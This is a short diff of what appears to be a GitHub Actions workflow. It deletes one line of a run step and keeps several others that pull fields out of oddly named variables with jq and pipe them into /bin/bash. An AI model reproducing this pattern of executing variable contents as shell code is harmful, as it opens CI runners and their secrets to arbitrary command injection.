@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$kfip66" | jq -r .xjmh3846 | /bin/bash
           printf '%s' "$ro2420" | jq -r .isrn73546 | /bin/bash
           printf '%s' "$s9" | jq -r .hi6674 | /bin/bash
-          echo $uzbg2 | jq -r .e932 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
